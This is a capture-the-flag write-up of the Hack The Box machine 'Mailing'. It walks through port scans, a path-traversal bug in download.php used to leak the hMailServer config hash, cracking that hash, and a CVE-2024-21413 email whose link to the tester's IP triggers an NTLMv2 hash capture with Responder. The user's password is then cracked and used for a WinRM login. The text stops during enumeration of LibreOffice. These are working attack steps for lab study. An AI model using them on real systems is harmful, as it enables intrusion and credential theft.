### Summary
We start this box with a lot of mail ports and a webserver open. We inspect the web server to see instructions on sending an email to `maya@mailing.htb` and what looks to be an `LFI` vulnerability in the webserver. We use the `LFI` to leak the `hMailServer` config file to get `SMTP` creds for `administrator@mailing.htb`. We find a hash leaking vulnerability in `Windows Mail` that forces `maya@mailing.htb` to attempt to authenticate with out `Responder` `SMB` server, allowing us to crack their hash and gain `WinRM`. We notice that `LibreOffice` is installed on the box and a directory `Important Documents` allows write access and regularly cleans itself. We find an RCE vulnerability in `LibreOffice` that we utilize to get a `nc64.exe` reverse shell as `localadmin`, granting us a root shell

#### Unintended
When the box was first released, the LFI vulnerability was also an RCE vulnerability due to the `download.php` endpoint utilizing `include($file_path)` instead of `file_get_contents($file_path)`. This allows for us to poison the `hMailServer` logs by sending malicious `php` code in an `SMTP` interaction and then including the logfile via the `download.php` endpoint with the `cmd` parameter, granting us a foothold as `iis apppool\defaultapppool`. This user has the `SeImpersonatePrivilege` privilege active, which is a prime case to use `GodPotato` to get arbitrary command execution as `root`, paving the way for a `root` reverse shell!

### Tools
- `ffuf`
- `feroxbuster`
- `burp`
- `python smtplib`
- `responder`
- `hashcat`
- `rlwrap`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Bruteforce]]
- [[#SMB - TCP 445]]
- [[#HTTP - TCP 80]]
	- [[#hFileServer Config File]]
	- [[#Validate Mail Password]]
###### [[#User Shell - maya]]
- [[#CVE-2024-21413 (MonikerLink)]]
	- [[#Background]]
	- [[#Exploit]]
- [[#Enumeration as maya]]
- [[#LibreOffice CVE-2023-2255]]
	- [[#Background]]
	- [[#Exploit]]
###### [[#Unintended Route]]
- [[#download.php Differences]]
- [[#hMailServer Log Location]]
- [[#SMTP Log Poisoning]]
- [[#GodPotato]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.232.39 -oN nmap/tcp           
PORT      STATE SERVICE      REASON
25/tcp    open  smtp         syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
110/tcp   open  pop3         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
143/tcp   open  imap         syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
465/tcp   open  smtps        syn-ack ttl 127
587/tcp   open  submission   syn-ack ttl 127
993/tcp   open  imaps        syn-ack ttl 127
5040/tcp  open  unknown      syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
7680/tcp  open  pando-pub    syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
50206/tcp open  unknown      syn-ack ttl 127
```
```sh
❯ sudo nmap -p 25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,50206 -sCV -vv 10.129.232.39 -oN nmap/tcpScripts
PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          syn-ack ttl 127 hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 127 hMailServer imapd
|_imap-capabilities: IDLE SORT QUOTA ACL IMAP4rev1 IMAP4 OK NAMESPACE completed CAPABILITY CHILDREN RIGHTS=texkA0001
445/tcp   open  microsoft-ds? syn-ack ttl 127
465/tcp   open  ssl/smtp      syn-ack ttl 127 hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/localityName=Madrid/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/localityName=Madrid/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
| SHA-1: 5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
587/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/localityName=Madrid/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/localityName=Madrid/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
| SHA-1: 5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      syn-ack ttl 127 hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/localityName=Madrid/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/localityName=Madrid/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
| SHA-1: 5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
|_imap-capabilities: IDLE SORT QUOTA ACL IMAP4rev1 IMAP4 OK NAMESPACE completed CAPABILITY CHILDREN RIGHTS=texkA0001
5040/tcp  open  unknown       syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?    syn-ack ttl 127
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50206/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-11T22:04:55
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 13342/tcp): CLEAN (Timeout)
|   Check 2 (port 59085/tcp): CLEAN (Timeout)
|   Check 3 (port 58664/udp): CLEAN (Timeout)
|   Check 4 (port 47486/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -6h40m50s
```
- The TTL corresponds with a Windows system if all the ports weren't enough of a clue
- It almost looks like an AD environment with `msrpc`, `winrm` and `smb`, but we're missing `kerberos` and `LDAP` and other ports
- We've got an `hMailServer` running on `SMTP`, `POP3`, and `IMAP` that reference a `mailing.htb` domain
- Given the `IIS` version, we're probably working with `Windows 10+`
- The webserver tried to navigate to the `mailing.htb` subdomain

### Subdomain Bruteforce
```sh
❯ ffuf -u "http://10.129.232.39" -H "Host: FUZZ.mailing.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -ac
```
- But we don't get anything interesting
- We'll add `mailing.htb` to our `/etc/hosts` file

## SMB - TCP 445
---
- We can try to enumerate `SMB` without creds using `nxc`
```sh
❯ nxc smb 10.129.232.39 --shares
SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:None)
SMB         10.129.232.39   445    MAILING          [-] Error enumerating shares: [Errno 32] Broken pipe

❯ nxc smb 10.129.232.39 -u '' -p '' --shares
SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:None)
SMB         10.129.232.39   445    MAILING          [-] MAILING\: STATUS_ACCESS_DENIED 
SMB         10.129.232.39   445    MAILING          [-] Error enumerating shares: Error occurs while reading from remote(104)

❯ nxc smb 10.129.232.39 -u 'guest' -p '' --shares
SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:None)
SMB         10.129.232.39   445    MAILING          [-] MAILING\guest: STATUS_LOGON_FAILURE 
```
- No cigar :(

## HTTP - TCP 80
---
- We navigate to the url to see `Mailing - The ultimate mail server`
- There are a few potential users here:
	- Ruy Alonso
	- Maya Bendito
	- Gregory Smith
- There's a link to [hMailServer](https://www.hmailserver.com/)
- We can also download the instructions for their mailserver
	- The instructions entail setting up a mail client and sending an email to `maya@mailing.htb` where she'll read it, implying we'll perform some form of phishing attack on `maya`
- I ran `feroxbuster` but it didn't show me anything new
- Making the request to download the instructions is interesting:
```http
http://mailing.htb/download.php?file=instructions.pdf
```
- Looks like some LFI potential
	- It's important to note that we're working with a Windows system to `/etc/hosts` isn't a valid payload anymore :)))
```http
GET /download.php?file=../../windows/system32/drivers/etc/hosts HTTP/1.1
Host: mailing.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mailing.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

HTTP/1.1 200 OK
Cache-Control: must-revalidate
Pragma: public
Content-Type: application/octet-stream
Expires: 0
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
Content-Description: File Transfer
Content-Disposition: attachment; filename="hosts"
X-Powered-By: ASP.NET
Date: Wed, 11 Feb 2026 22:32:37 GMT
Content-Length: 849

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

127.0.0.1	mailing.htb
```
- We get LFI! `../../windows/system32/drivers/etc/hosts`
- We can try to nab the `download.php` file with this LFI:
```sh
❯ curl "http://mailing.htb/download.php?file=../download.php"                       
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>
```

### hFileServer Config File
- We can try to grab the config file for `hfileserver` (`hfileserver.ini`) which seems to be located in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`
```http
GET /download.php?file=../../program+files+(x86)/hmailserver/bin/hmailserver.ini HTTP/1.1
Host: mailing.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mailing.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

HTTP/1.1 200 OK
Cache-Control: must-revalidate
Pragma: public
Content-Type: application/octet-stream
Expires: 0
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
Content-Description: File Transfer
Content-Disposition: attachment; filename="hmailserver.ini"
X-Powered-By: ASP.NET
Date: Wed, 11 Feb 2026 23:15:29 GMT
Content-Length: 604

[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```
- Looks like we've got some potential credentials! But they look to be encrypted with `PasswordEncryption=1`
- We can try to slap them into crackstation
- `841bb5acfa6779ae432fd7a4e6600ba7` is an md5 hash of `homenetworkingadministrator`
	- This is allegedly the `administrator` password, but it doesn't work with `nxc` testing for `administrator`

### Validate Mail Password
- Given that the credential came from `hMailServer`, we can see if it auths with `SMTP`:
```python
In [1]: import smtplib

In [2]: server = smtplib.SMTP('mailing.htb:587')

In [3]: server.login('administrator', 'homenetworkingadministrator')
---------------------------------------------------------------------------
SMTPAuthenticationError                   Traceback (most recent call last)
Cell In[3], line 1
----> 1 server.login('administrator', 'homenetworkingadministrator')

File /usr/lib64/python3.13/smtplib.py:764, in SMTP.login(self, user, password, initial_response_ok)
    761         last_exception = e
    763 # We could not login successfully.  Return result of last attempt.
--> 764 raise last_exception

File /usr/lib64/python3.13/smtplib.py:753, in SMTP.login(self, user, password, initial_response_ok)
    751 method_name = 'auth_' + authmethod.lower().replace('-', '_')
    752 try:
--> 753     (code, resp) = self.auth(
    754         authmethod, getattr(self, method_name),
    755         initial_response_ok=initial_response_ok)
    756     # 235 == 'Authentication successful'
    757     # 503 == 'Error: already authenticated'
    758     if code in (235, 503):

File /usr/lib64/python3.13/smtplib.py:671, in SMTP.auth(self, mechanism, authobject, initial_response_ok)
    669 if code in (235, 503):
    670     return (code, resp)
--> 671 raise SMTPAuthenticationError(code, resp)

SMTPAuthenticationError: (535, b'Authentication failed. Restarting authentication process.')

In [4]: server.login('administrator@mailing.htb', 'homenetworkingadministrator')
Out[4]: (235, b'authenticated.')
```
- Looks like we have valid `SMTP` creds! `administrator@mailing.htb` / `homenetworkingadministrator`

# User Shell - maya
## CVE-2024-21413 (MonikerLink)
---
### Background
- I now understand why this box is rated poorly
- Given the instructions setting up a `Windows Mail` client, that's likely where the vulnerability we need to exploit via `maya` is
- We can look up `Windows Mail CVE` and we're redirected to the this [Github POC](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)
- The meat of the exploit logic is as follows:
```html
<html>
<body>
	<img src="{base64_image_string}" alt="Image"><br />
	<h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
</body>
</html>
```
- When the `file:` filter is sent where a link ends with `![anything]` then security filters let it pass
- The `link_url` in the repo README is an `SMB` link, which if we host an `SMB` server with `Responder` will allow us to capture `maya`'s `NTLMv2` challenge response hash which we can hopefully crack for creds!

### Exploit
- First, we need to run `Responder` as root so we can open port `445` and listen for incoming `SMB` connections
```sh
sudo /home/aldamd/.local/bin/responder -I tun0
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                  
                   |__|
...
```

- Then we can run the POC script:
```sh
❯ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender yomama@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.78\share\sploit' --subject 'OPEN QUICK! ASAP'

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.
```
- the `--recipient` needs to be `maya@mailing.htb` as seen in the instructions PDF
- the `--sender` parameter doesn't really matter
- the `--url` path doesn't really matter as long as the IP is correct and being passed to our `SMB` server
- the `--subject` parameter also doesn't really matter

- After waiting for a few painful minutes, `Responder` gets a hash!
```sh
[SMB] NTLMv2-SSP Client   : 10.129.232.39
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:4191a482c626db3e:D5B3B4E1F87BE614CBA5C0CFFBF2DFC5:0101000000000000806C13F0869BDC01968CED5F64E7D60400000000020008004C005A005900590001001E00570049004E002D005300300038004600440033005A004E0058005A005A0004003400570049004E002D005300300038004600440033005A004E0058005A005A002E004C005A00590059002E004C004F00430041004C00030014004C005A00590059002E004C004F00430041004C00050014004C005A00590059002E004C004F00430041004C0007000800806C13F0869BDC0106000400020000000800300030000000000000000000000000200000E73B753EE01291B2BFCA43151DD73C1578C8D56BE8177448D93F56C2E2FBEDDE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370038000000000000000000
```

- We can save the hash to a file and have `hashcat` automatically determine the type and crack this baby open
```sh
❯ hashcat maya.hash ~/ctf/TOOLS/wordlist/rockyou.txt 
...
MAYA::MAILING:4191a482c626db3e:d5b3b4e1f87be614cba5c0cffbf2dfc5:0101000000000000806c13f0869bdc01968ced5f64e7d60400000000020008004c005a005900590001001e00570049004e002d005300300038004600440033005a004e0058005a005a0004003400570049004e002d005300300038004600440033005a004e0058005a005a002e004c005a00590059002e004c004f00430041004c00030014004c005a00590059002e004c004f00430041004c00050014004c005a00590059002e004c004f00430041004c0007000800806c13f0869bdc0106000400020000000800300030000000000000000000000000200000e73b753ee01291b2bfca43151dd73c1578c8d56be8177448d93f56c2e2fbedde0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370038000000000000000000:m4y4ngs4ri
...
```
- We've got creds! `maya` / `m4y4ngs4ri`
- We can verify with `nxc`
```sh
❯ nxc winrm 10.129.232.39 -u maya -p m4y4ngs4ri
WINRM       10.129.232.39   5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING) 
WINRM       10.129.232.39   5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
```

## Enumeration as maya
---
- Now we can grab `user.txt`!
```sh
❯ evil-winrm -i 10.129.232.39 -u maya -p m4y4ngs4ri
*Evil-WinRM* PS C:\Users\maya\Desktop> cat user.txt
cdb813a27c3cc0c3ade89e53b2c6307f
```

- There's another user in the home directory called `localadmin`
- There's the `wwwroot` directory in the root folder but we can't read it as `maya`
- There's `inetpub` which contains the default `IIS` page
- There's another interesting directory called `Important Documents` in the root directory but it's empty. We're able to write to it however
- We can enumerate the `Program Files` to see that `LibreOffice` is installed which is a bit strange
```powershell
*Evil-WinRM* PS C:\Program Files\libreoffice> cat program/version.ini
[Version]
AllLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia ckb cs cy da de dgo dsb dz el en-GB en-ZA eo es et eu fa fi fr fur fy ga gd gl gu gug he hsb hi hr hu id is it ja ka kab kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ szl ta te tg th tn tr ts tt ug uk uz ve vec vi xh zh-CN zh-TW zu
buildid=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
ExtensionUpdateURL=https://updateexte.libreoffice.org/ExtensionUpdateService/check.Update
MsiProductVersion=7.4.0.1
ProductCode={A3C6520A-E485-47EE-98CC-32D6BB0529E4}
ReferenceOOoMajorMinor=4.1
UpdateChannel=
